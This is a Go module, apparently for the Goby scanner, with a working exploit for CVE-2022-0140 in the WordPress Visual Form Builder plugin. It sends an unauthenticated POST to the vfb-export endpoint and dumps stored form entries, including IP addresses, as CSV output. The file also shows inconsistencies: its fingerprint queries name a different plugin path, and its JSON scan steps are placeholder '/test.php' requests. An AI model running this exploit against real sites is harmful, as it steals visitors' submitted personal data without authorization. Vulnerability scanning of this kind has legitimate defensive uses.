package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Visual Form Builder Plugin vfb-export Unauthorized Access Vulnerability (CVE-2022-0140)",
    "Description": "<p>WordPress and WordPress plugin are products of the WordPress Foundation. WordPress is a blog platform developed using PHP language. The platform supports personal blog websites on PHP and MySQL servers.</p><p>The WordPress plug-in Visual Form Builder before 3.0.6 contains an unauthorized access vulnerability that allows unauthenticated users to view form entries or export them as CSV files using the vfb export endpoint.</p>",
    "Product": "Visual Form Builder",
    "Homepage": "https://cn.wordpress.org/plugins/visual-form-builder/",
    "DisclosureDate": "2022-12-20",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"/wp-content/plugins/visualcomposer/\"",
    "GobyQuery": "body=\"/wp-content/plugins/visualcomposer/\"",
    "Level": "1",
    "Impact": "<p>The WordPress plug-in Visual Form Builder before 3.0.6 contains an unauthorized access vulnerability that allows unauthenticated users to view form entries or export them as CSV files using the vfb export endpoint.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://cn.wordpress.org/plugins/visual-form-builder/\">https://cn.wordpress.org/plugins/visual-form-builder/</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/9fa2b3b6-2fe3-40f0-8f71-371dd58fe336"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2022-0140"
    ],
    "CNNVD": [
        "CNNVD-202204-3151"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.2",
    "Translation": {
        "CN": {
            "Name": "WordPress Visual Form Builder 插件 vfb-export 表单未授权访问漏洞（CVE-2022-0140）",
            "Product": "Visual Form Builder",
            "Description": "<p>WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。</p><p>WordPress 插件 Visual Form Builder 3.0.6 之前版本存在未授权访问漏洞，该漏洞允许未经身份验证的用户查看表单条目或使用 vfb-export 端点将其导出为 CSV 文件。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://cn.wordpress.org/plugins/visual-form-builder/\">https://cn.wordpress.org/plugins/visual-form-builder/</a><br></p>",
            "Impact": "<p>WordPress 插件 Visual Form Builder 3.0.6 之前版本存在未授权访问漏洞，该漏洞允许未经身份验证的用户查看表单条目或使用 vfb-export 端点将其导出为 CSV 文件。<br><br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "WordPress Visual Form Builder Plugin vfb-export Unauthorized Access Vulnerability (CVE-2022-0140)",
            "Product": "Visual Form Builder",
            "Description": "<p>WordPress and WordPress plugin are products of the WordPress Foundation. WordPress is a blog platform developed using PHP language. The platform supports personal blog websites on PHP and MySQL servers.</p><p>The WordPress plug-in Visual Form Builder before 3.0.6 contains an unauthorized access vulnerability that allows unauthenticated users to view form entries or export them as CSV files using the vfb export endpoint.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://cn.wordpress.org/plugins/visual-form-builder/\">https://cn.wordpress.org/plugins/visual-form-builder/</a></p>",
            "Impact": "<p>The WordPress plug-in Visual Form Builder before 3.0.6 contains an unauthorized access vulnerability that allows unauthenticated users to view form entries or export them as CSV files using the vfb export endpoint.</p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10789"
}`


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/wp-admin/admin.php?page=vfb-export")
			cfg.Header.Store("Referer", u.HostInfo+"/wp-admin/admin.php?page=vfb-export")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Origin", u.HostInfo)
			cfg.FollowRedirect = false
			cfg.Data = "vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File"
			resp, err := httpclient.DoHttpRequest(u, cfg)
			if err != nil {
				return false
			}

			if strings.Contains(resp.Utf8Html, "Date Submitted") && strings.Contains(resp.HeaderString.String(),".csv")&& resp.StatusCode == 200 {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/wp-admin/admin.php?page=vfb-export")
			cfg.Header.Store("Referer", expResult.HostInfo.HostInfo+"/wp-admin/admin.php?page=vfb-export")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Origin", expResult.HostInfo.HostInfo)
			cfg.FollowRedirect = false
			cfg.Data = "vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File"
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				expResult.Success = false
			}

			if strings.Contains(resp.Utf8Html, "IP Address") && strings.Contains(resp.Utf8Html, "Date Submitted") && resp.StatusCode == 200 {
				expResult.Output = resp.Utf8Html
				expResult.Success = true
			}
			return expResult
		},
	))
}